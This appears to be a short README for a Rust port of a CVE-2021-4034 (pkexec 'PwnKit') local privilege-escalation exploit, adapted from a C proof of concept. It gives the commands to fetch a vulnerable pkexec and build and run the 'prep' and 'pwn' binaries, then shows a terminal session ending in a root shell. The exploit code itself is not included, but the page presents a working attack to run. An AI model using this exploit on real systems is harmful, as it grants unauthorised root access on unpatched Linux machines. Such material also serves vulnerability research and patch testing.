### CVE-2021-4034 exploit but in rust, cause why not ?

Based on https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c

```
$ ./download-and-unpack-vulnerable-pkexec.sh
*optionally enable setuid/setgid for testing*
$ cargo run --bin prep && cd playground && cargo run --bin pwn
    Finished dev [unoptimized + debuginfo] target(s) in 0.00s
     Running `target/debug/prep`
    Finished dev [unoptimized + debuginfo] target(s) in 0.00s
     Running `/home/defhacks/hack/cve-2021-4034/target/debug/pwn`
gconv() called
sh-5.1# /bin/id
uid=0(root) gid=1000(defhacks) groups=1000(defhacks)
sh-5.1#
```
